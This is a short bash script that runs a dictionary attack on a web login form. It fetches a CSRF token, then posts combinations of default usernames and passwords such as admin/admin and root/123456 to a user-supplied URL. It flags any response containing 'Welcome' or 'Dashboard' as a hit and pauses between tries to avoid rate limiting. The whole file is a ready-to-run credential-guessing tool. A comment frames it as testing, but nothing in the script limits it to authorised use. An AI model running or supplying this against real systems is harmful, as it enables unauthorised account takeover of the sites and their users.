#!/bin/bash

# Common credentials for testing
USERNAMES=("admin" "root" "test" "administrator")
PASSWORDS=("admin" "root" "123456" "password" "admin123")

# Validate input URL
read -p "Enter target URL: " TARGET_URL
if [[ ! $TARGET_URL =~ ^https?:// ]]; then
    echo "Error: Invalid URL format. Must start with http:// or https://"
    exit 1
fi

# Check if cookies file exists
if [ ! -f "cookies.txt" ]; then
    echo "Warning: cookies.txt not found. Creating empty file..."
    touch cookies.txt
fi

# Get CSRF token if needed
TOKEN=$(curl -s -c cookies.txt -b cookies.txt "$TARGET_URL" | grep -o 'name="token" value="[^"]*"' | cut -d'"' -f4)

echo "Starting credential test..."
for user in "${USERNAMES[@]}"; do
    for pass in "${PASSWORDS[@]}"; do
        echo "[*] Trying: $user / $pass"
        RESPONSE=$(curl -s -X POST -b cookies.txt \
            -H "Content-Type: application/x-www-form-urlencoded" \
            -d "username=$user&password=$pass&token=$TOKEN" \
            "$TARGET_URL")

        # Check response for success indicators
        if [[ $RESPONSE =~ "Welcome" ]] || [[ $RESPONSE =~ "Dashboard" ]]; then
            echo "[+] Success! Valid credentials found:"
            echo "Username: $user"
            echo "Password: $pass"
            exit 0
        fi

        sleep 1 # Prevent rate limiting
    done
done

echo "[-] No valid credentials found."
exit 0
